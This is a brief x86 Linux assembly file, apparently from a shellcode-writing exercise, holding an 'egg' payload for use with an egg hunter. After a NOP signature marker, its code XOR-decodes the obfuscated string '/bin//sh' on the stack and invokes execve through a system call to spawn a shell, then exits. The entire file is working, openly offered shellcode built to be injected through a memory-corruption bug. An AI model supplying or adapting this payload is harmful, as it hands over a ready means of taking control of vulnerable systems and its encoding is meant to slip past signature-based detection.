; Egg.nasm
; Author: Tristan aka R3OATH
; Website: www.r3oath.com

global _start

section .text
_start:

	; Shellcode Signature
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	; Shellcode
	xor ecx, ecx
	mul ecx
	push ecx
	mov esi, 0xdeadbeef
	push 0xb6de91c0
	push 0xb0c4dcc0
	xor [esp], esi
	xor [esp +4], esi
	mov ebx, esp
	mov al, 0xb
	int 0x80
	sub al, 0xa
	int 0x80	
